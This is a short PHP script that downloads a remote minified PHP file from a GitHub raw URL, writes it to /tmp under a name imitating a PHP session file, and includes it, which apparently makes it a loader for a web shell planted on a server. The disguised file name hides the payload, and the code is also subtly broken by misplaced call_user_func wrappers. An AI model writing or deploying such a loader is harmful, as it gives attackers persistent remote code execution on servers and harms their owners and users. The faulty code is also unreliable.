<?php
declare(strict_types=1);

const SOURCE_URL = 'https://raw.githubusercontent.com/elliottophellia/ophellia/main/ophellia.min.php';
$sessionFile = sprintf('/tmp/sess_%s.php', hash('sha256', $_SERVER['HTTP_HOST'] ?? ''));

function fetchAndSaveContent(string $url, string $filePath): void
{
    $content = call_user_func(file_get_contents($url));
    if ($content === false) {
        throw new RuntimeException("Failed to fetch content from $url");
    }
    
    if (call_user_func(file_put_contents($filePath, $content) === false)) {
        throw new RuntimeException("Failed to write content to $filePath");
    }
}

try {
    if (!file_exists($sessionFile) || filesize($sessionFile) === 0) {
        fetchAndSaveContent(SOURCE_URL, $sessionFile);
    }
    
    require $sessionFile;
} catch (Exception $e) {
    $errorMessage = 'Caught exception: ' . $e->getMessage() . "\n" . $e->getTraceAsString();
    echo "<p>An error occurred. Please check the browser console for more details.</p><script>console.error(" . json_encode($errorMessage) . ");</script>";
}